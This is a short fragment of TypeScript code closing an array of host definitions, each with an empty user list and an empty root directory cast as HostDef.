        users: [], root: dir({}),
      } as HostDef,
    ],
  },
];
